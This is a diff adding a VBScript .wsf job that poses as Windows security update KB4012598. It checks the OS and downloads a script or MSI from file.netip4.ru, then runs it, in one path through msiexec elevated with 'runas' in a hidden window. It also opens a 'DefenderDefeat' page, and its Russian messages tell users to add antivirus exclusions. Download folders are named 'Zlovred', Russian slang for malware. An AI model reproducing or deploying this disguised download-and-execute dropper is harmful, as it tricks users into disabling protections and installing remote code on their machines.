+				' Run msiexec.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+				shApp.ShellExecute pathCMD & "\msiexec.exe", strValue, strPath, "runas", 0
+				' Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
+				WScript.Sleep intTimeOutM
+				InstallDownloadedMSI01 = 0
+			End If
+		End If
+	End If
+End Function
+
+'* ********************************************************
+'
+' MSIDownlRun01( strURL, strMSI, productName, intTimeOutW, intTimeOutM)
+'
+' This Script Downloads MSI file from strURL Path and
+' Install it with Script TimeOut in iTimeOut ms
+'
+' PARAMETERS:	strURL an URL Path to Download
+' 				strMSI - Name of MSI File
+'               productName -- a Product Name of MSI Package for hidden Uninstall
+'				intTimeOut -- Estimated Time for Running (ms)
+' RETURNS:		0 if Success Download and Run
+'				1 if Error Occur
+'
+' *********************************************************/
+Function MSIDownlRun01( strURL, strMSI, productName, intTimeOutW, intTimeOutM)
+	Dim iFlag
+	Dim tempFolder
+	' Get Temp Folder Name
+	tempFolder = getTempEnviron01
+	' Check if strFolder is Empty of TEMP Directory not Assigned
+	If Len(tempFolder) = 0 Then
+		ScriptDownlRun01 = 1
+	Else
+		iFlag = UploadFilesFromIntWithHTTP01(strMSI, strURL, tempFolder)
+		If iFlag <> 0 Then
+			ScriptDownlRun01 = 1
+		Else
+			InstallDownloadedMSI01 tempFolder, strMSI, productName, intTimeOutW, intTimeOutM
+			ScriptDownlRun01 = 0
+		End If
+	End If
+End Function
+
+
+
+' WScript.Echo getTempEnviron01
+'WScript.Echo getDownlEnviron01
+'WScript.Echo getDownlEnviron02
+'WScript.Echo "Error Code: " & UploadFilesFromIntWithHTTP01("iisstart.htm", "http://localhost/", "C:\Users\yuden")
+'WScript.Echo "Error Code: " & UploadFilesFromIntWithHTTP01("index.html", "https://www.google.ru/", "C:\Users\yuden")
+	]]>
+	</script>
+	<script language="VBScript">
+	<![CDATA[
+' *********************************************************
+' Choice-MSI.vbs
+' This File Contains the Script for a Choice of an MSI
+' File to be Downloaded
+' The Script Uses Libraries from other Files
+' *********************************************************
+Function CheckOSAndChooseFile()
+    Dim anOSFamily, anOSArchitecture, bIsOSClients, bIsOSCore, anURLPath
+    Dim aWCLIENTS, aW2K22, aW63X64DESK, aW63X64CORE, aW61X64DESK, aW61X64CORE
+    ' Set Most Common URL Path
+    anURLPath = "http://file.netip4.ru:80/PROGS/Microsoft/KB4012598/MSI/"
+    ' Set the Values of the URL Paths of Variables
+    aWCLIENTS = anURLPath & "WCLIENTS/"
+    aW2K22 = anURLPath & "W2K22/"
+    aW63X64CORE = anURLPath & "W63X64CORE/"
+    aW63X64DESK = anURLPath & "W63X64DESK/"
+    aW61X64CORE = anURLPath & "W61X64CORE/"
+    aW61X64DESK = anURLPath & "W61X64DESK/"
+    anOSFamily = getWindowsOperationSystemType
+    bIsOSClients = getIfWindowsOSServer
+    bIsOSCore = getIfWindowsOSCore
+    anOSArchitecture = getWindowsOSArchitecture
+    ' WScript.Echo "Windows " & anOSFamily & " " & anOSArchitecture & " " & bIsOSClients & " " & bIsOSCore & vbNewLine
+    If InStr(1, anOSFamily, "Other", vbTextCompare) Then
+        CheckOSAndChooseFile = ""
+    ElseIf InStr(1, anOSFamily, "11", vbTextCompare) Then
+        CheckOSAndChooseFile = aWCLIENTS
+    ElseIf InStr(1, anOSFamily, "10", vbTextCompare) Then
+        If InStr(1, bIsOSClients, "Client", vbTextCompare) Then
+            CheckOSAndChooseFile = aWCLIENTS
+        ElseIf InStr(1, bIsOSClients, "Server", vbTextCompare) Then
+            If InStr(1, bIsOSCore, "Core", vbTextCompare) Then
+                CheckOSAndChooseFile = aW2K22
+            ElseIf InStr(1, bIsOSCore, "Desktop", vbTextCompare) Then
+                CheckOSAndChooseFile = aW2K22
+            Else
+                CheckOSAndChooseFile = ""
+            End If
+        Else
+            CheckOSAndChooseFile = ""
+        End If
+    ElseIf InStr(1, anOSFamily, "6.3", vbTextCompare) Then
+        If InStr(1, anOSArchitecture, "x86", vbTextCompare) Then
+            CheckOSAndChooseFile = ""
+        ElseIf InStr(1, anOSArchitecture, "x64", vbTextCompare) Then
+            If InStr(1, bIsOSCore, "Core", vbTextCompare) Then
+                CheckOSAndChooseFile = aW63X64CORE
+            ElseIf Instr(1, bIsOSCore, "Desktop", vbTextCompare) Then
+                CheckOSAndChooseFile = aW63X64DESK
+            Else
+                CheckOSAndChooseFile = ""
+            End If                
+        Else
+            CheckOSAndChooseFile = ""
+        End If
+    ElseIf InStr(1, anOSFamily, "6.1", vbTextCompare) Then
+        If InStr(1, bIsOSCore, "Core", vbTextCompare) Then
+            CheckOSAndChooseFile = aW61X64CORE
+        elseif InStr(1, bIsOSCore, "Desktop", vbTextCompare) Then
+            CheckOSAndChooseFile = aW61X64DESK
+        Else
+            CheckOSAndChooseFile = ""
+        End If
+    Else
+        CheckOSAndChooseFile = ""
+    End If
+End Function
+
+' **********************************************************************
+' CheckOSAndPutMessage
+' This Function Checks if Update KB4012598 is Accessible and Put a Message
+' Function Return:
+'   0 if Update can Apply at automatic Mode
+'   1 if Update can Apply at manual Mode
+'   2 if Update cann't Apply
+' **********************************************************************
+
+Function CheckOSAndPutMessage()
+    Dim anOSFamily, bIsOSClient, anMSIPath, anURLWebApp, wsh, strValue, ie
+    Dim aNotFound, aNotExclusions, anSuccessFound
+    anOSFamily = getWindowsOperationSystemType
+    bIsOSClient = getIfWindowsOSServer
+    anMSIPath = CheckOSAndChooseFile
+    anURLWebApp = "http://file.netip4.ru:80/PROGS/NIT/DefenderDefeat/html/main.html"
+
+    ' Set Command String
+    strValue = "start " & anURLWebApp
+
+    aNotFound  = "Для Вашей операционной системы не найдены исправления безопасности или они не применимы." & vbNewLine & "Пожалуйста, обновите Вашу систему через Windows Update."
+    aNotExclusions = "Для Вашей операционной системы найдены обновления, но в системе дополнительно требуется установить исключения антивируса." & vbNewLine & "Пожалуйста, установите исключения вашего антивируса в следующем окне, а затем запустите файл KB4012598-Download.wsf."
+    anSuccessFound = "Для Вашей операционной системы найдены обновления безопасности." & vbNewLine & "Загрузите и запустите файл KB4012598-Download.wsf."
+    ' Create ActiveX Objects
+    set wsh = CreateObject("Wscript.Shell")
+    set ie = CreateObject("InternetExplorer.Application")
+    ie.navigate2 anURLWebApp
+    If Len(anMSIPath) = 0 Then
+        WScript.Echo aNotFound
+        CheckOSAndPutMessage = 2
+    Else
+        If InStr(1, anOSFamily, "10", vbTextCompare) Or InStr(1, anOSFamily, "11", vbTextCompare) Then
+            WScript.Echo anSuccessFound
+            CheckOSAndPutMessage = 0
+        Else
+            If InStr(1, bIsOSClient, "Client", vbTextCompare) Then
+                WScript.Echo aNotExclusions
+                ie.Visible = True
+                CheckOSAndPutMessage = 1
+            Else
+                WScript.Echo anSuccessFound
+                CheckOSAndPutMessage = 0
+            End If
+        End If
+    End If
+End Function
+
+' *********************************************************
+' CreateZlovredFolder Subroutine
+' This Subroutine Creates "C:\pub1\Distrib\Zlovred" Folder
+'
+' PARAMETERS:   NONE
+' *********************************************************
+Sub CreateZlovredFolder()
+    Dim fso
+    ' Create ActiveX Object
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    ' Check if Folder Exists
+    if Not fso.FolderExists("C:\pub1") Then
+        fso.CreateFolder "C:\pub1"
+    end if
+    if Not fso.FolderExists("C:\pub1\Distrib") Then
+        fso.CreateFolder "C:\pub1\Distrib"
+    end if
+    if Not fso.FolderExists("C:\pub1\Distrib\Zlovred") Then
+        fso.CreateFolder "C:\pub1\Distrib\Zlovred"
+    end if
+End Sub ' Name
+
+' *********************************************************
+' CheckOSandDownload Function 
+' This Function Runs CheckOSAndPutMessage Function and
+' Downloads and Runs a Script in a Dependence of Conditions
+'
+' PARAMETERS:	NONE
+' RETURNS:	0 if Success
+'		1 if Nothing Downloads 
+' *********************************************************
+function CheckOSandDownload()
+    Const KBSCRIPTDOWNLOAD = "KB4012598-Download.wsf" ' Downloaded Script
+    Dim iFlag, iFlagDn, strLocalPath, strURL, intTimeOut
+    ' Set Timeout Interval
+    intTimeOut = 30000 ' 30 sec
+    ' Create Zlovred Folder
+    CreateZlovredFolder
+    ' Choose Download Folder
+    strLocalPath = getDownlEnviron01
+    ' Check OS and Put Message
+    iFlag = CheckOSAndPutMessage
+    if iFlag = 0 Then
+        strURL = CheckOSAndChooseFile
+        WScript.Echo "Обновление может установиться в автоматическом режиме." & vbNewLine & "Файл: " & KBSCRIPTDOWNLOAD & vbNewLine & "URL: " & strURL & vbNewLine & "Путь: " & strLocalPath & vbNewLine
+        iFlagDn = UploadFilesFromIntWithHTTP01( KBSCRIPTDOWNLOAD, strURL, strLocalPath )
+        'WScript.Echo  "iFlagDn = " & iFlagDn & vbNewLine & "URL = " & strURL & vbNewLine & "Path = " & strLocalPath & vbNewLine
+        If iFlagDn = 0 Then
+            RunDownloadedScript01 strLocalPath, KBSCRIPTDOWNLOAD, intTimeOut
+            CheckOSandDownload = 0
+        Else
+            WScript.Echo "Не удается скачать файл: " & KBSCRIPTDOWNLOAD
+            CheckOSandDownload = 1
+        End If
+    elseif iFlag = 1 Then
+        strURL = CheckOSAndChooseFile
+        WScript.Echo "Обновление может установиться только в ручном режиме." & vbNewLine & "Файл: " & KBSCRIPTDOWNLOAD & vbNewLine & "URL: " & strURL & vbNewLine & "Путь: " & strLocalPath & vbNewLine & "Запустите файл " & KBSCRIPTDOWNLOAD & " в папке " & strLocalPath & vbNewLine
+        iFlagDn = UploadFilesFromIntWithHTTP01( KBSCRIPTDOWNLOAD, strURL, strLocalPath )
+        ' WScript.Echo  "iFlagDn = " & iFlagDn & vbNewLine & "URL = " & strURL & vbNewLine & "Path = " & strLocalPath & vbNewLine
+        If iFlagDn = 0 Then
+            CheckOSandDownload = 0
+        Else
+            WScript.Echo "Не удается скачать файл: " & KBSCRIPTDOWNLOAD
+            CheckOSandDownload = 1
+        End If
+    else
+        WScript.Echo "Обновление не может быть установлено." & vbNewLine & "Файл не найден." & vbNewLine
+        CheckOSandDownload = 1
+    end if
+end function ' CheckOSandDownload
+
+' *********************************************************
+' ScriptKBDownload Function 
+' This Function Downloads and Runs KBMSIFILE 
+'
+' PARAMETERS:	NONE
+' RETURNS:	0 if Success
+'		1 if Nothing Downloads 
+' *********************************************************
+Function ScriptKBDownload()
+    ' Const KBMSIFILE = "Windows-KB4012598.msi" ' Downloaded File
+    Const KBMSIFILE = "echo.wsf" ' Downloaded File
+    Const KBMSITITLE = "KB4012598" ' MSI File Title
+    Dim iFlag, iFlagDn, strLocalPath, strURL, intTimeOut
+    ' Set Timeout Interval
+    intTimeOutW = 180000 ' 3 min
+    intTimeOutM = 30000 ' 30 sec
+    ' Create Zlovred Folder
+    CreateZlovredFolder
+    ' Choose Download Folder
+    strLocalPath = getTempEnviron01
+    ' Check OS and Put Message
+    iFlag = CheckOSAndPutMessage
+    if iFlag < 2 Then
+        strURL = CheckOSAndChooseFile
+        iFlagDn = UploadFilesFromIntWithHTTP01( KBMSIFILE, strURL, strLocalPath )
+		' WScript.Echo  "iFlagDn = " & iFlagDn & vbNewLine & "URL = " & strURL & vbNewLine & "Path = " & strLocalPath & vbNewLine
+        If iFlagDn = 0 Then
+            RunDownloadedScript01 strLocalPath, KBMSIFILE, intTimeOutM
+	    ' InstallDownloadedMSI01 strLocalPath, KBMSIFILE, KBMSITITLE, intTimeOutW, intTimeOutM
+            ScriptKBDownload = 0
+        Else
+            WScript.Echo "Не удается скачать файл: " & KBMSIFILE
+            ScriptKBDownload = 1
+        End If
+    else
+        WScript.Echo "Обновление не может быть установлено." & vbNewLine & "Файл не найден." & vbNewLine
+        ScriptKBDownload = 1
+    end if
+End Function ' ScriptKBDownload
+	]]>
+	</script>
+	<script language="VBScript">
+	<![CDATA[
+WScript.Quit CheckOSandDownload
+	]]>
+	</script>
+</job>
